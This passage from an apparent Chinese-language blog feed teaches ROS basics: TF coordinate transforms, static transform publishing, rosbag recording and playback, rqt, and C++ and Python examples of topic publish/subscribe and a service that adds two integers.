    <span class="n">tf2_ros</span><span class="o">::</span><span class="n">Buffer</span> <span class="n">buffer</span><span class="p">;</span>
    <span class="n">tf2_ros</span><span class="o">::</span><span class="n">TransformListener</span> <span class="n">listener</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="n">ros</span><span class="o">::</span><span class="n">Rate</span> <span class="n">r</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">ros</span><span class="o">::</span><span class="n">ok</span><span class="p">())</span>
    <span class="p">{</span>
        <span class="n">geometry_msgs</span><span class="o">::</span><span class="n">PointStamped</span> <span class="n">point_laser</span><span class="p">;</span>
        <span class="n">point_laser</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">frame_id</span> <span class="o">=</span> <span class="s">"laser"</span><span class="p">;</span>
        <span class="n">point_laser</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">stamp</span> <span class="o">=</span> <span class="n">ros</span><span class="o">::</span><span class="n">Time</span><span class="o">::</span><span class="n">now</span><span class="p">();</span>
        <span class="n">point_laser</span><span class="p">.</span><span class="n">point</span><span class="p">.</span><span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">point_laser</span><span class="p">.</span><span class="n">point</span><span class="p">.</span><span class="n">y</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="n">point_laser</span><span class="p">.</span><span class="n">point</span><span class="p">.</span><span class="n">z</span> <span class="o">=</span> <span class="mf">7.3</span><span class="p">;</span>

        <span class="k">try</span>
        <span class="p">{</span>
            <span class="n">geometry_msgs</span><span class="o">::</span><span class="n">PointStamped</span> <span class="n">point_base</span><span class="p">;</span>
            <span class="n">point_base</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">.</span><span class="n">transform</span><span class="p">(</span><span class="n">point_laser</span><span class="p">,</span><span class="s">"base_link"</span><span class="p">);</span>
            <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"转换后的数据:(%.2f,%.2f,%.2f),参考的坐标系是:"</span><span class="p">,</span><span class="n">point_base</span><span class="p">.</span><span class="n">point</span><span class="p">.</span><span class="n">x</span><span class="p">,</span><span class="n">point_base</span><span class="p">.</span><span class="n">point</span><span class="p">.</span><span class="n">y</span><span class="p">,</span><span class="n">point_base</span><span class="p">.</span><span class="n">point</span><span class="p">.</span><span class="n">z</span><span class="p">,</span><span class="n">point_base</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">frame_id</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">exception</span><span class="o">&amp;</span> <span class="n">e</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"程序异常....."</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">r</span><span class="p">.</span><span class="n">sleep</span><span class="p">();</span>
        <span class="n">ros</span><span class="o">::</span><span class="n">spinOnce</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h4 id="补充使用命令行工具">补充：使用命令行工具</h4> <p>当坐标系之间的相对位置固定时，可以使用 ROS 系统封装好的专门节点：</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosrun tf2_ros static_transform_publisher x偏移量 y偏移量 z偏移量 z偏航角度 y俯仰角度 x翻滚角度 父级坐标系 子级坐标系
</code></pre></div></div> <p>示例：</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosrun tf2_ros static_transform_publisher 0.2 0 0.5 0 0 0 /baselink /laser
</code></pre></div></div> <p>可以借助于 rviz 显示坐标系关系，具体操作：</p> <ul> <li>新建窗口输入命令: <code class="language-plaintext highlighter-rouge">rviz</code></li> <li>在启动的 rviz 中设置 Fixed Frame 为 <code class="language-plaintext highlighter-rouge">base_link</code></li> <li>点击左下的 add 按钮，在弹出的窗口中选择 TF 组件，即可显示坐标关系</li> </ul> <hr/> <h2 id="三rosbag-使用">三、rosbag 使用</h2> <h3 id="命令行使用">命令行使用</h3> <p><strong>需求：</strong> ROS 内置的乌龟案例并操作，操作过程中使用 rosbag 录制，录制结束后，实现重放</p> <p><strong>实现：</strong></p> <ol> <li><strong>准备</strong> - 创建目录保存录制的文件</li> </ol> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> ./xxx
<span class="nb">cd </span>xxx
</code></pre></div></div> <ol> <li><strong>开始录制</strong></li> </ol> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosbag record <span class="nt">-a</span> <span class="nt">-O</span> 目标文件
</code></pre></div></div> <p>操作小乌龟一段时间，结束录制使用 ctrl + c，在创建的目录中会生成 bag 文件。</p> <ol> <li><strong>查看文件</strong></li> </ol> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosbag info 文件名
</code></pre></div></div> <ol> <li><strong>回放文件</strong></li> </ol> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosbag play 文件名
</code></pre></div></div> <p>重启乌龟节点，会发现，乌龟按照录制时的轨迹运动。</p> <h3 id="编码使用">编码使用</h3> <p>（具体实现见相关文档）</p> <hr/> <h2 id="四rqt-工具箱">四、rqt 工具箱</h2> <h3 id="rqt-基本使用">rqt 基本使用</h3> <p><strong>启动方式有两种：</strong></p> <ul> <li>方式1: <code class="language-plaintext highlighter-rouge">rqt</code></li> <li>方式2: <code class="language-plaintext highlighter-rouge">rosrun rqt_gui rqt_gui</code></li> </ul> <p><strong>基本使用：</strong></p> <p>启动 rqt 之后，可以通过 plugins 添加所需的插件。</p> <h3 id="rqt-常用插件">rqt 常用插件</h3> <p>（具体插件列表见相关文档）</p> <hr/> <h2 id="总结">总结</h2> <p>ROS 运行管理和常用组件是 ROS 开发中的重要组成部分：</p> <ol> <li><strong>运行管理</strong> - 节点、话题、参数的命名空间和重映射</li> <li><strong>TF 坐标变换</strong> - 机器人坐标系之间的转换</li> <li><strong>rosbag</strong> - 数据录制和回放工具</li> <li><strong>rqt</strong> - ROS 可视化工具集</li> </ol> <p>掌握这些工具和技巧，可以更高效地进行 ROS 机器人开发。</p>]]></content><author><name></name></author><category term="ROS"/><category term="ROS"/><category term="机器人"/><category term="运行管理"/><category term="TF坐标变换"/><category term="工具"/><summary type="html"><![CDATA[ROS 运行管理、TF 坐标变换、rosbag、rqt 等常用组件的使用指南]]></summary></entry><entry><title type="html">ROS 基础入门指南</title><link href="https://gewenhao.win/blog/2023/ROS%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/" rel="alternate" type="text/html" title="ROS 基础入门指南"/><published>2023-09-01T10:00:00+00:00</published><updated>2023-09-01T10:00:00+00:00</updated><id>https://gewenhao.win/blog/2023/ROS%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97</id><content type="html" xml:base="https://gewenhao.win/blog/2023/ROS%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"><![CDATA[<h1 id="ros-基础入门指南">ROS 基础入门指南</h1> <h2 id="ros-概述与环境搭建">ROS 概述与环境搭建</h2> <p>ROS（Robot Operating System）是一个用于编写机器人软件的灵活框架。它提供了硬件抽象、设备驱动、库、可视化工具、消息传递和包管理等功能。</p> <h3 id="环境搭建">环境搭建</h3> <p>个人没有在虚拟机装 VSCode，使用 VSCode 的远程连接进行开发，体验也不错，就是有些模块还是得到虚拟机操作，比如小乌龟模块启动运行。引出的虚拟机如何固定 IP 之后做详细记录。</p> <hr/> <h2 id="一话题通信topic">一、话题通信（Topic）</h2> <p>话题通信是 ROS 中最常用的通信方式，采用发布/订阅模型，实现节点间异步通信。</p> <h3 id="话题通信-c-实现流程">话题通信 C++ 实现流程</h3> <p><strong>发布方逻辑：</strong></p> <ol> <li>包含头文件</li> <li>初始化 ROS 节点:命名(唯一)</li> <li>实例化 ROS 句柄</li> <li>实例化 发布者 对象</li> <li>组织被发布的数据，并编写逻辑发布数据</li> </ol> <p><strong>订阅方逻辑：</strong></p> <ol> <li>包含头文件</li> <li>初始化 ROS 节点:命名(唯一)</li> <li>实例化 ROS 句柄</li> <li>实例化 订阅者 对象</li> <li>处理订阅的消息(回调函数)</li> <li>设置循环调用回调函数</li> </ol> <h3 id="c-代码示例">C++ 代码示例</h3> <p><strong>发布方：</strong></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ros/ros.h"</span><span class="cp">
#include</span> <span class="cpf">"std_msgs/String.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;sstream&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">b</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">feibo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">tmp</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="mi">1</span><span class="o">||</span><span class="n">x</span><span class="o">==</span><span class="mi">2</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">b</span><span class="o">+=</span><span class="n">a</span><span class="p">;</span>
        <span class="n">a</span><span class="o">=</span><span class="n">tmp</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">b</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"fabuzhe"</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="n">nh</span><span class="p">;</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">Publisher</span> <span class="n">pub</span><span class="o">=</span><span class="n">nh</span><span class="p">.</span><span class="n">advertise</span><span class="o">&lt;</span><span class="n">std_msgs</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span><span class="p">(</span><span class="s">"fibonacci"</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
    <span class="n">std_msgs</span><span class="o">::</span><span class="n">String</span> <span class="n">msg</span><span class="p">;</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">Rate</span> <span class="n">rate</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">count</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">Duration</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">sleep</span><span class="p">();</span><span class="c1">// 留时间来在master中注册</span>
    <span class="k">while</span><span class="p">(</span><span class="n">ros</span><span class="o">::</span><span class="n">ok</span><span class="p">())</span>
    <span class="p">{</span>
        <span class="n">count</span><span class="o">++</span><span class="p">;</span>
        <span class="n">std</span><span class="o">::</span><span class="n">stringstream</span> <span class="n">ss</span><span class="p">;</span>
        <span class="n">ss</span><span class="o">&lt;&lt;</span><span class="n">feibo</span><span class="p">(</span><span class="n">count</span><span class="p">);</span>
        <span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="o">=</span><span class="n">ss</span><span class="p">.</span><span class="n">str</span><span class="p">();</span>
        <span class="n">pub</span><span class="p">.</span><span class="n">publish</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
        <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"发布的数据是%s"</span><span class="p">,</span><span class="n">ss</span><span class="p">.</span><span class="n">str</span><span class="p">().</span><span class="n">c_str</span><span class="p">());</span>
        <span class="n">rate</span><span class="p">.</span><span class="n">sleep</span><span class="p">();</span>
        <span class="n">ros</span><span class="o">::</span><span class="n">spinOnce</span><span class="p">();</span><span class="c1">//官方建议的处理回调函数</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>订阅方：</strong></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ros/ros.h"</span><span class="cp">
#include</span> <span class="cpf">"std_msgs/String.h"</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">doMSG</span><span class="p">(</span><span class="k">const</span> <span class="n">std_msgs</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">ConstPtr</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"%s "</span><span class="p">,</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"jieshouzhe"</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="n">nh</span><span class="p">;</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">Subscriber</span> <span class="n">sub</span><span class="o">=</span><span class="n">nh</span><span class="p">.</span><span class="n">subscribe</span><span class="o">&lt;</span><span class="n">std_msgs</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span><span class="p">(</span><span class="s">"fibonacci"</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="n">doMSG</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">spin</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h3 id="话题通信-python-实现流程">话题通信 Python 实现流程</h3> <p><strong>发布者逻辑：</strong></p> <ol> <li>导包</li> <li>初始化 ROS 节点:命名(唯一)</li> <li>实例化 发布者 对象</li> <li>组织被发布的数据，并编写逻辑发布数据</li> </ol> <p><strong>订阅者逻辑：</strong></p> <ol> <li>导包</li> <li>初始化 ROS 节点:命名(唯一)</li> <li>实例化 订阅者 对象</li> <li>处理订阅的消息(回调函数)</li> <li>设置循环调用回调函数</li> </ol> <h3 id="python-代码示例">Python 代码示例</h3> <p><strong>发布者：</strong></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/env python
</span><span class="kn">import</span> <span class="n">rospy</span>
<span class="kn">from</span> <span class="n">std_msgs.msg</span> <span class="kn">import</span> <span class="n">String</span>

<span class="n">a</span><span class="o">=</span><span class="mi">1</span>
<span class="n">b</span><span class="o">=</span><span class="mi">1</span>

<span class="k">def</span> <span class="nf">js</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>
    <span class="nf">if</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">x</span><span class="o">==</span><span class="mi">2</span><span class="p">):</span>
        <span class="k">return</span> <span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">tmp</span><span class="o">=</span><span class="n">b</span>
        <span class="n">b</span><span class="o">+=</span><span class="n">a</span>
        <span class="n">a</span><span class="o">=</span><span class="n">tmp</span>
        <span class="k">return</span> <span class="n">b</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">init_node</span><span class="p">(</span><span class="sh">"</span><span class="s">tolker</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">pub</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nc">Publisher</span><span class="p">(</span><span class="sh">"</span><span class="s">fibonacci</span><span class="sh">"</span><span class="p">,</span><span class="n">String</span><span class="p">,</span><span class="n">queue_size</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">msg</span><span class="o">=</span><span class="nc">String</span><span class="p">()</span>
    <span class="n">rate</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nc">Rate</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">count</span><span class="o">=</span><span class="mi">0</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">rospy</span><span class="p">.</span><span class="nf">is_shutdown</span><span class="p">():</span>
        <span class="n">count</span><span class="o">+=</span><span class="mi">1</span>
        <span class="n">ans</span><span class="o">=</span><span class="nf">js</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>
        <span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
        <span class="n">pub</span><span class="p">.</span><span class="nf">publish</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
        <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">输出的数据为:%s</span><span class="sh">"</span><span class="p">,</span><span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>
        <span class="n">rate</span><span class="p">.</span><span class="nf">sleep</span><span class="p">()</span>
</code></pre></div></div> <p><strong>订阅者：</strong></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/env python
</span><span class="kn">import</span> <span class="n">rospy</span>
<span class="kn">from</span> <span class="n">std_msgs.msg</span> <span class="kn">import</span> <span class="n">String</span>

<span class="k">def</span> <span class="nf">doMSG</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">%s </span><span class="sh">"</span><span class="p">,</span><span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">init_node</span><span class="p">(</span><span class="sh">"</span><span class="s">listener</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">sub</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nc">Subscriber</span><span class="p">(</span><span class="sh">"</span><span class="s">fibonacci</span><span class="sh">"</span><span class="p">,</span><span class="n">String</span><span class="p">,</span><span class="n">doMSG</span><span class="p">,</span><span class="n">queue_size</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">spin</span><span class="p">()</span>
</code></pre></div></div> <hr/> <h2 id="二服务通信service">二、服务通信（Service）</h2> <p>服务通信采用请求/响应模型，实现节点间同步通信。</p> <h3 id="服务通信-c-实现">服务通信 C++ 实现</h3> <p><strong>服务端逻辑：</strong></p> <ol> <li>包含头文件</li> <li>初始化 ROS 节点</li> <li>创建 ROS 句柄</li> <li>创建 服务 对象</li> <li>回调函数处理请求并产生响应</li> <li>由于请求有多个，需要调用 ros::spin()</li> </ol> <p><strong>客户端逻辑：</strong></p> <ol> <li>包含头文件</li> <li>初始化 ROS 节点</li> <li>创建 ROS 句柄</li> <li>创建 客户端 对象</li> <li>请求服务，接收响应</li> </ol> <h3 id="c-代码示例-1">C++ 代码示例</h3> <p><strong>服务端：</strong></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ros/ros.h"</span><span class="cp">
#include</span> <span class="cpf">"plubing_server_client/addint.h"</span><span class="cp">
</span>
<span class="kt">bool</span> <span class="nf">doADD</span><span class="p">(</span><span class="n">plubing_server_client</span><span class="o">::</span><span class="n">addint</span><span class="o">::</span><span class="n">Request</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span><span class="n">plubing_server_client</span><span class="o">::</span><span class="n">addint</span><span class="o">::</span><span class="n">Response</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">num1</span><span class="o">=</span><span class="n">req</span><span class="p">.</span><span class="n">num1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">num2</span><span class="o">=</span><span class="n">req</span><span class="p">.</span><span class="n">num2</span><span class="p">;</span>
    <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"收到数据：%d,%d"</span><span class="p">,</span><span class="n">num1</span><span class="p">,</span><span class="n">num2</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">sum</span><span class="o">=</span><span class="n">num1</span><span class="o">+</span><span class="n">num2</span><span class="p">;</span>
    <span class="n">res</span><span class="p">.</span><span class="n">sum</span><span class="o">=</span><span class="n">sum</span><span class="p">;</span>
    <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"求得的数据：%d"</span><span class="p">,</span><span class="n">sum</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"server"</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="n">nh</span><span class="p">;</span>
    <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"服务已经启动------"</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">ServiceServer</span> <span class="n">server</span><span class="o">=</span><span class="n">nh</span><span class="p">.</span><span class="n">advertiseService</span><span class="p">(</span><span class="s">"addint"</span><span class="p">,</span><span class="n">doADD</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">spin</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>客户端：</strong></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ros/ros.h"</span><span class="cp">
#include</span> <span class="cpf">"plubing_server_client/addint.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"提交的参数个数错误"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"client"</span><span class="p">);</span>
        <span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="n">nh</span><span class="p">;</span>
        <span class="n">ros</span><span class="o">::</span><span class="n">ServiceClient</span> <span class="n">client</span><span class="o">=</span><span class="n">nh</span><span class="p">.</span><span class="n">serviceClient</span><span class="o">&lt;</span><span class="n">plubing_server_client</span><span class="o">::</span><span class="n">addint</span><span class="o">&gt;</span><span class="p">(</span><span class="s">"addint"</span><span class="p">);</span>
        <span class="n">plubing_server_client</span><span class="o">::</span><span class="n">addint</span> <span class="n">ai</span><span class="p">;</span>
        <span class="n">ai</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">num1</span><span class="o">=</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">ai</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">num2</span><span class="o">=</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
        <span class="n">client</span><span class="p">.</span><span class="n">waitForExistence</span><span class="p">();</span><span class="c1">//判断服务端是否启动，从而决定是否挂起</span>
        <span class="kt">bool</span> <span class="n">flag</span><span class="o">=</span><span class="n">client</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="n">ai</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"响应成功"</span><span class="p">);</span>
            <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"响应结果为：%d"</span><span class="p">,</span><span class="n">ai</span><span class="p">.</span><span class="n">response</span><span class="p">.</span><span class="n">sum</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"响应失败"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h3 id="服务通信-python-实现">服务通信 Python 实现</h3> <p><strong>服务端：</strong></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/env python
</span><span class="kn">import</span> <span class="n">rospy</span>
<span class="kn">from</span> <span class="n">plubing_server_client.srv</span> <span class="kn">import</span> <span class="n">addint</span><span class="p">,</span><span class="n">addintRequest</span><span class="p">,</span><span class="n">addintResponse</span>

<span class="k">def</span> <span class="nf">doreq</span><span class="p">(</span><span class="n">req</span><span class="p">):</span>
    <span class="nb">sum</span><span class="o">=</span><span class="n">req</span><span class="p">.</span><span class="n">num1</span><span class="o">+</span><span class="n">req</span><span class="p">.</span><span class="n">num2</span>
    <span class="n">response</span><span class="o">=</span><span class="nf">addintResponse</span><span class="p">()</span>
    <span class="n">response</span><span class="p">.</span><span class="nb">sum</span><span class="o">=</span><span class="nb">sum</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">服务器响应:%d+%d=%d</span><span class="sh">"</span><span class="p">,</span><span class="n">req</span><span class="p">.</span><span class="n">num1</span><span class="p">,</span><span class="n">req</span><span class="p">.</span><span class="n">num2</span><span class="p">,</span><span class="n">response</span><span class="p">.</span><span class="nb">sum</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">init_node</span><span class="p">(</span><span class="sh">"</span><span class="s">pyserver</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">server</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nc">Service</span><span class="p">(</span><span class="sh">"</span><span class="s">addint</span><span class="sh">"</span><span class="p">,</span><span class="n">addint</span><span class="p">,</span><span class="n">doreq</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">服务已启动--------</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">spin</span><span class="p">()</span>
</code></pre></div></div> <p><strong>客户端：</strong></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/env python
</span><span class="kn">import</span> <span class="n">rospy</span>
<span class="kn">from</span> <span class="n">plubing_server_client.srv</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">3</span><span class="p">:</span>
